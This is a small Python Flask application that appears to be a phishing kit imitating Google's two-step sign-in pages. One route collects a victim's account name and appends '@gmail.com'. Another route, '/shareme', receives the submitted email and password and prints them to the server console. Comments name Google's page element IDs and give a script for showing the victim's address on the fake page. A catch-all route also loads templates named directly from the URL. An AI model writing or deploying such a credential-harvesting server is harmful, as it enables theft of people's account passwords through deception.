from flask import Flask, render_template, request,session
import sqlite3
import re

app=Flask(__name__)

@app.route('/')
def index():
    return render_template('index.html')

@app.route("/googlepass",methods=['POST'])
def glogin():
    mail=request.form['identifier']
    print('\n\n\n',mail,'\n\n\n')
    if not re.findall(r"@gmail.com",mail):mail+="@gmail.com"
    return render_template('googlepass.html',act=mail)

@app.route("/shareme",methods=['POST'])
def share():
    email=request.form['email']
    passwd=request.form['pass']
    print('\n\n\n',email,passwd,'\n\n\n')
    return render_template('share.html')

@app.route("/<name>",methods=['GET'])
def login(name):
    return render_template(f'{name}.html')


# google account show profileIdentifier

# google next identifierNext

# <script>
#    $(document).ready(function(){
#    document.getElementById("profileIdentifier").innerText="{{act}}";
#    });
#    </script>
if __name__=="__main__":
    app.run(port=4000)